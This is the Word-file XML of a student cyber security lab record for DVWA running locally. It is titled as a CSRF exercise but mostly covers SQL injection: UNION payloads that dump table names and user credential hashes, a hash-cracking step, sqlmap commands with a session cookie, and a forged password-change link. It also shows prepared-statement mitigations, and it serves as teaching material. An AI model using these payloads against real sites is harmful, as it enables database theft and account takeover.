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E0494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 xml:space="preserve">Sree Dharshini M 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110</w:t>
      </w:r>
      <w:bookmarkStart w:id="0" w:name="_GoBack"/>
      <w:bookmarkEnd w:id="0"/>
    </w:p>
    <w:p w14:paraId="73A4116E">
      <w:pPr>
        <w:pStyle w:val="2"/>
      </w:pPr>
      <w:r>
        <w:t>Exercise 11</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>Perform Cross-site Request Forgery (CSRF) Attack</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A8AF194">
      <w:r>
        <w:t>Aim:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7431DBDB">
      <w:r>
        <w:t>To demonstrate a Cross-Site Request Forgery (CSRF) attack using the Damn Vulnerable Web</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CC39032">
      <w:r>
        <w:t>Application (DVWA) running on XAMPP</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E46B43B">
      <w:r>
        <w:t>Tools:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29D998CA">
      <w:r>
        <w:t>XAMPP (Apache + MySQL + PHP)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CE6701D">
      <w:r>
        <w:t>DVWA (Damn Vulnerable Web Application)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6313DDAB">
      <w:r>
        <w:t>SQL Injection:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76A1DBC1">
      <w:r>
        <w:t>WHERE (username = 'admin' AND password = '') OR 1=1 OR ''</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="594D5B2A">
      <w:r>
        <w:t>Id =1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="594D54CE">
      <w:r>
        <w:t>http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7471B382">
      <w:r>
        <w:t>$id = $_REQUEST[ 'id' ];</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1720E286">
      <w:r>
        <w:t xml:space="preserve">    switch ($_DVWA['SQLI_DB']) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14776AE5">
      <w:r>
        <w:t xml:space="preserve">        case MYSQL:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DA1FFC1">
      <w:r>
        <w:t xml:space="preserve">            // Check database</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52FF725A">
      <w:r>
        <w:t xml:space="preserve">            $query = "SELECT first_name, last_name FROM users WHERE user_id = '$</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A199DBF">
      <w:r>
        <w:t>id';";</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="459DC7D7">
      <w:r>
        <w:t>Get Database:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40D7496E">
      <w:r>
        <w:t>Data base available in dvwa</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="012E0D5B">
      <w:r>
        <w:t>Department of Computer Science and Engineering (Cyber Security)/CR23331</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06800DA2">
      <w:r>
        <w:t>Query:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E108767">
      <w:r>
        <w:t>1’ union select 1, table_schema from information_schema.tables union select 1, ‘1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E687703">
      <w:r>
        <w:t>Meaning:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17733A46">
      <w:r>
        <w:t>The leading ' closes the application’s open quote.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39DBD087">
      <w:r>
        <w:t>UNION SELECT 1, table_name — returns two columns to match id, title.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DA598EF">
      <w:r>
        <w:t>FROM information_schema.tables WHERE table_schema = 'dvwa' — restricts to the dvwa schema.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11EB2A57">
      <w:r>
        <w:t>-- comments out the remainder of the original SQL to avoid syntax errors.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="537C0335">
      <w:r>
        <w:t>Get tables:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EA1BE73">
      <w:r>
        <w:t>classic UNION-based SQL injection attempt intended to enumerate database metadata</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E9C3920">
      <w:r>
        <w:t>Query:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64472CFB">
      <w:r>
        <w:t>1’ union select 1, table_name from information_schema.tables where table_schema= ‘dvwa’ union select 1, ‘1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27230FF8">
      <w:r>
        <w:t>Close an existing quoted value in the original query (1'),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0234B8F6">
      <w:r>
        <w:t>Append rows from information_schema.tables (specifically the table_schema column) to the original</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B02737C">
      <w:r>
        <w:t>result set using UNION SELECT, and</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44B40EDE">
      <w:r>
        <w:t>Add another UNION SELECT that supplies a harmless row (1, '1') to match column/type</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71D6A075">
      <w:r>
        <w:t>requirements or confuse filters.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48EF9232">
      <w:r>
        <w:t>Department of Computer Science and Engineering (Cyber Security)/CR23331</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C53A108">
      <w:r>
        <w:t>User account will be in users table</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60952D6C">
      <w:r>
        <w:t>Get Column information of the table</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="615551A7">
      <w:r>
        <w:t>Get Columns:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24229FCD">
      <w:r>
        <w:t>Query:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B2F8898">
      <w:r>
        <w:t>1’ union select 1, column_name from information_schema.columns where table_schema =’dvwa’ and table_name =</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C2EC25B">
      <w:r>
        <w:t>‘users’ union select 1, ‘1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62093C20">
      <w:r>
        <w:t>Get Username and Password:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03086590">
      <w:r>
        <w:t>Query: 1’ union select 1,concat(user, “:”,password) from dvwa.users union select 1,’1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74B7DB95">
      <w:r>
        <w:t>Table columns</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58077DBC">
      <w:r>
        <w:t xml:space="preserve"> User id                First_name              Last_name               User             password</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00074EB4">
      <w:r>
        <w:t>Department of Computer Science and Engineering (Cyber Security)/CR23331</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="341FB801">
      <w:r>
        <w:t>username password:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="169058EF">
      <w:r>
        <w:t>admin: 5f4dcc3b5aa765d61d8327deb882cf99</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="495E7783">
      <w:r>
        <w:t>use crackstation.net</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77F60665">
      <w:r>
        <w:t>Mitigation:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02E355C8">
      <w:r>
        <w:t>1.Escape when quotations are encountered</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6159F789">
      <w:r>
        <w:t>$id = $_POST[ 'id' ];</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2476647F">
      <w:r>
        <w:t xml:space="preserve">     $id = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $id);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C171FE6">
      <w:r>
        <w:t>2. Sanitize input and validate it</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79C9ADB3">
      <w:r>
        <w:t>$id = $_GET[ 'id' ];</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E4CE0C5">
      <w:r>
        <w:t xml:space="preserve">     // Was a number entered?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6308ED29">
      <w:r>
        <w:t xml:space="preserve">     if(is_numeric( $id )) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A08A5E3">
      <w:r>
        <w:t xml:space="preserve">          $id = intval ($id);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A2B1E55">
      <w:r>
        <w:t xml:space="preserve">          switch ($_DVWA['SQLI_DB']) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D6ADE7E">
      <w:r>
        <w:t>Department of Computer Science and Engineering (Cyber Security)/CR23331</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1144D79F">
      <w:r>
        <w:t xml:space="preserve">            case MYSQL:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="481C43E2">
      <w:r>
        <w:t xml:space="preserve">                // Check the database</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51B7E18A">
      <w:r>
        <w:t xml:space="preserve">                $data = $db-</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="319A5EF5">
      <w:r>
        <w:t>&gt;prepare( 'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A97399A">
      <w:r>
        <w:t>' );</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A30CB59">
      <w:r>
        <w:t xml:space="preserve">                $data-&gt;bindParam( ':id', $id, PDO::PARAM_INT );</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E6BF69E">
      <w:r>
        <w:t>Open Zap</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FFAAE2D">
      <w:r>
        <w:t>In browser 127.0.0.1/DAWN enter admin:password</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D962B5D">
      <w:r>
        <w:t>ZAP captures the request</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C2E55C3">
      <w:r>
        <w:t>Department of Computer Science and Engineering (Cyber Security)/CR23331</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DE68BD0">
      <w:r>
        <w:t>It has session id</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4019A9B7">
      <w:r>
        <w:t>Download SQLMAP</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B58C76C">
      <w:r>
        <w:t>Unzip go that folder</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F9FA9AA">
      <w:r>
        <w:t>Cd C:\Users\balus\Downloads\sqlmap</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75E30655">
      <w:r>
        <w:t>Python sqlmap.py -h</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DF2BEEE">
      <w:r>
        <w:t>python sqlmap.py -u "http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit" --</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="719C0553">
      <w:r>
        <w:t>cookie="PHPSESSID=g833nc5k1lcj0nnggvumnfj1o4; security=low" --proxy="http://localhost:8080"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B7E9C9C">
      <w:r>
        <w:t>-dbs</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32946B45">
      <w:r>
        <w:t>security=low; PHPSESSID=g833nc5k1lcj0nnggvumnfj1o4</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="325252F1">
      <w:r>
        <w:t>Department of Computer Science and Engineering (Cyber Security)/CR23331</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5598B3CE">
      <w:r>
        <w:t>-D dvwa –tables</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73551C29">
      <w:r>
        <w:t>CSRF:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="013C2A92">
      <w:r>
        <w:t>Cross site Request forgery:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AD192A4">
      <w:r>
        <w:t>Department of Computer Science and Engineering (Cyber Security)/CR23331</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="089133C7">
      <w:r>
        <w:t>&lt;textarea&gt;hello&lt;/textarea&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54DF6A2D">
      <w:r>
        <w:t>Department of Computer Science and Engineering (Cyber Security)/CR23331</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44A17B26">
      <w:r>
        <w:t>http://127.0.0.1/DVWA/vulnerabilities/csrf/?password_new=temp123&amp;password_conf=temp123&amp;C</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3ACB3D04">
      <w:r>
        <w:t>hange=Change#</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A0C6C6F">
      <w:r>
        <w:t>enter temp123</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E9708D0">
      <w:r>
        <w:t>&lt;a</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4ECF5AA6">
      <w:r>
        <w:t>href="http://127.0.0.1/DVWA/vulnerabilities/csrf/?password_new=hacked&amp;password_conf=hacked</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BF30A36">
      <w:r>
        <w:t>&amp;Change=Change#"&gt;Click Here&lt;/a&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7ED17C95">
      <w:r>
        <w:t>Open in zap browser</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EF3F0C4">
      <w:r>
        <w:t>Result:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D4B7EF8">
      <w:r>
        <w:t>After the victim (still logged into DVWA) visits the attacker page, the target action executes</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FC6BF04">
      <w:r>
        <w:t>automatically.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D6BAD8E">
      <w:r>
        <w:t>Department of Computer Science and Engineering (Cyber Security)/CR23331</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="133FB5F1">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>Screenshots</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DD66068">
      <w:r>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="114300" distR="114300">
            <wp:extent cx="5029200" cy="6087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7284">
      <w:r>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="114300" distR="114300">
            <wp:extent cx="5029200" cy="465201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20C3">
      <w:r>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="114300" distR="114300">
            <wp:extent cx="5029200" cy="216344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3E7F">
      <w:r>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="114300" distR="114300">
            <wp:extent cx="5029200" cy="172085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CA60">
      <w:r>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="114300" distR="114300">
            <wp:extent cx="5029200" cy="1939925"/>
            <wp:effectExtent l="0" t="0" r="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2B71">
      <w:r>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="114300" distR="114300">
            <wp:extent cx="5029200" cy="351599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F566">
      <w:r>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="114300" distR="114300">
            <wp:extent cx="5029200" cy="163893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36B1">
      <w:r>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="114300" distR="114300">
            <wp:extent cx="5029200" cy="254127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042B">
      <w:r>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="114300" distR="114300">
            <wp:extent cx="5029200" cy="963930"/>
            <wp:effectExtent l="0" t="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72FF">
      <w:r>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="114300" distR="114300">
            <wp:extent cx="5029200" cy="248031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BD1C">
      <w:r>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="114300" distR="114300">
            <wp:extent cx="5029200" cy="2331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2D59">
      <w:r>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="114300" distR="114300">
            <wp:extent cx="5029200" cy="55499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107B">
      <w:r>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="114300" distR="114300">
            <wp:extent cx="5029200" cy="34988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7B3F">
      <w:r>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="114300" distR="114300">
            <wp:extent cx="5029200" cy="154876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A074">
      <w:r>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="114300" distR="114300">
            <wp:extent cx="5029200" cy="2638425"/>
            <wp:effectExtent l="0" t="0" r="0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9778">
      <w:r>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="114300" distR="114300">
            <wp:extent cx="5029200" cy="112014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2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D2B8">
      <w:r>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="114300" distR="114300">
            <wp:extent cx="5029200" cy="409384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9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99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509</Words>
  <Characters>3549</Characters>
  <Lines>0</Lines>
  <Paragraphs>0</Paragraphs>
  <TotalTime>0</TotalTime>
  <ScaleCrop>false</ScaleCrop>
  <LinksUpToDate>false</LinksUpToDate>
  <CharactersWithSpaces>4168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2026-10-14T13:47:26Z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733F628BB717469AB21D3D601A56A887_13</vt:lpwstr>
  </property>
</Properties>
</file>